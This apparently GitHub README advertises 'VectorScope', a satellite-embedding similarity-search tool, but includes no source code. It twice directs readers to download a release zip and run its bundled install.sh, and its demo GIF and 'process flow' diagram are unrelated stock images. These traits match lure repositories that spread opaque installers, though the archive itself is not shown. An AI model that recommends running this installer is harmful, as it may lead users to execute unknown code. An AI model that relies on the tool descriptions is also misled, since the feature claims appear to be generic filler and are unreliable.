# VectorScope — Satellite Embeddings for Landcover Similarity Search

[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/lougsaad/VectorScope/releases)

🌍 🔬 📈

A tool for mapping surface types with Google’s Satellite Embedding V1. Draw sample points or load point assets, compute cosine-similarity heatmaps from 64‑dimensional embeddings for any year, tune thresholds, and toggle heatmaps on and off.

Badges
- Topics: ai · alphaearth · earthengine · earthobservation · embeddings · eo · geospatial · geospatialai · googleearthengine · landcovermapping · remotesensing
- License: MIT

Hero image
![Earth satellite](https://eoimages.gsfc.nasa.gov/images/imagerecords/146000/146494/world.topo.bathy.200412.3x5400x2700.jpg)

---

## Key features 🚀

- Map surface types by drawing points on a web map or by loading point assets (CSV, GeoJSON, KML).
- Use Google Satellite Embedding V1 to produce 64‑dimensional vectors for image patches.
- Compute cosine similarity between a sample embedding and all pixels to create heatmaps.
- Support for year selection so you can target historical or recent imagery.
- Threshold tuning and color ramp control to refine class extents.
- Toggle between raw embedding layers and similarity heatmaps.
- Export similarity raster and point outputs for post-processing.

---

## Quick demo GIF
![Demo map interaction](https://upload.wikimedia.org/wikipedia/commons/3/3f/Globe_rotating_fast.gif)

---

## Install and run (Releases) ⬇️

Download the release file vectorscope-release.zip from the Releases page and run the installer included in the archive:

1. Visit the Releases page:
   https://github.com/lougsaad/VectorScope/releases

2. Download the asset named `vectorscope-release.zip`.

3. Unzip and run the installer:
```bash
unzip vectorscope-release.zip
cd vectorscope-release
chmod +x install.sh
./install.sh
```

If that link does not work, open the repository and check the "Releases" section for the latest packaged build.

---

## Quick start — run in 5 steps ✍️

1. Start the app (after install):
```bash
vectorscope start
```

2. Open the app in your browser at http://localhost:8080

3. Draw 1 or more sample points on the map, or upload a point file (CSV/GeoJSON/KML).

4. Pick a year and press "Compute". The app fetches Satellite Embedding V1 vectors and computes cosine similarity.

5. Adjust the similarity threshold and toggles to refine the heatmap.

---

## Input formats and assets

- Vector point CSV (lat, lon, id, label)
- GeoJSON point collection
- KML point file
- Earth Engine asset ID (for advanced users)

Example CSV:
```csv
id,lat,lon,label
sample-1,40.7128,-74.0060,roof
sample-2,40.7138,-74.0050,roof
```

When you upload a file, the app converts points to an internal asset and computes embeddings for the chosen year.

---

## How it works — simplified

1. The app queries Google Satellite Embedding V1 for image patches centered on your points. Each patch maps to a 64‑dimensional vector.
2. For the target year, the app tiles the area and extracts embeddings per tile (64D vector per pixel or patch).
3. The app computes cosine similarity between the sample embedding (mean of selected sample points) and each tile embedding.
4. The similarity values form a heatmap. You can set a threshold to create a binary mask representing similar surface types.

Key terms:
- Embedding: a 64D numeric vector that represents the content of a satellite image patch.
- Cosine similarity: a measure between -1 and 1 that shows how close two vectors are in direction.
- Threshold: a cutoff value. Values above the threshold mark “similar” pixels.

Diagram
![Process flow](https://upload.wikimedia.org/wikipedia/commons/2/2c/Diagram_3D_cube.svg)

---

## Parameters you can tune

- Year: select any available year for imagery.
- Patch size: choose the pixel window used to compute embeddings.
- Similarity metric: cosine similarity (default).
- Threshold: slider from -1.0 to 1.0 to binarize the heatmap.
- Smoothing: optional morphological filter to remove speckle.
- Color ramp: choose palette for visual interpretation.

Recommended starting values:
- Patch size: 64 px
- Threshold: 0.8 for high precision, 0.6 for broader coverage

---

## Example workflows

Mapping roofs from a handful of samples:
1. Draw 3-5 sample points on known roofs.
2. Choose the target year.
3. Compute similarity and set threshold = 0.85.
4. Export the binary mask and validate with high-resolution imagery.

Change detection between years:
1. Compute heatmap for year A, then for year B using the same samples.
2. Subtract masks to find areas that gained or lost the surface type.

Large-area mapping:
1. Upload point asset for multiple sample clusters.
2. Use batched computation across tiles.
3. Aggregate similarity results and export per-tile summaries.

---

## Export and outputs

- GeoTIFF similarity heatmap (floating point)
- GeoTIFF binary mask (thresholded)
- GeoJSON of detected clusters with area and centroid
- CSV of per-sample statistics

Export example:
- Click Export > GeoTIFF > Save

---

## Earth Engine integration

VectorScope calls Earth Engine where supported. The app uses Earth Engine to fetch imagery tiles, sample and compute embeddings, and to export final rasters.

If you use Earth Engine:
- Authenticate with your Earth Engine account.
- Provide the app permission to run computations on your behalf.
- Use Earth Engine asset IDs to pass sample points or study areas.

---

## Performance tips

- Limit the study area for initial testing.
- Use fewer sample points to get a quick prototype embedding.
- Set a higher threshold to reduce false positives during exploration.
- Use server-side tiling when processing large areas.

---

## Security and privacy

- The app only uploads sample points and requested tiles needed for embeddings.
- You can run everything locally if you avoid cloud authentication.

---

## Troubleshooting

- If similarity maps look flat: check your sample points; they may be outside valid imagery or represent mixed classes.
- If Earth Engine call fails: re-authenticate and verify permissions.
- If processing hangs on large regions: split the area into tiles and run in batch mode.

---

## Logs and diagnostics

- Logs print to the terminal where you run `vectorscope start`.
- Use `vectorscope diagnose` to collect an environment report for debugging.

---

## API reference (core endpoints)

- POST /api/embeddings/sample — submit samples and return mean embedding
- POST /api/embeddings/tile — compute tile embeddings for a region and year
- POST /api/similarity — compute cosine similarity between sample and tiles
- GET /api/export — request export of raster or vector result

Example request to compute similarity (curl):
```bash
curl -X POST http://localhost:8080/api/similarity \
  -H "Content-Type: application/json" \
  -d '{"region":"POLYGON(...)","year":2022,"samples":[{"lat":...,"lon":...}],"threshold":0.8}'
```

---

## Development and contribution 👩‍💻👨‍💻

- Repo layout
  - /app — frontend UI
  - /server — API and Earth Engine integration
  - /scripts — helper scripts
  - /docs — additional docs and examples

- Tests: run unit and integration tests with:
```bash
make test
```

- To contribute:
  - Fork the repo
  - Create a feature branch
  - Add tests for new behavior
  - Submit a pull request

Code of Conduct and Contributing files live in the repository.

---

## Data sources and credits

- Google Satellite Embedding V1 (embedding provider)
- Google Earth Engine (imagery and computation)
- Public basemaps and satellite sources where available
- Iconography and images: NASA Earth Observatory, Wikimedia Commons

---

## License

MIT — see LICENSE file.

---

Releases and downloads
- Download the release asset `vectorscope-release.zip` and run the included installer from:
  https://github.com/lougsaad/VectorScope/releases

Topics
- ai, alphaearth, earthengine, earthobservation, embeddings, eo, geospatial, geospatialai, googleearthengine, landcovermapping, remotesensing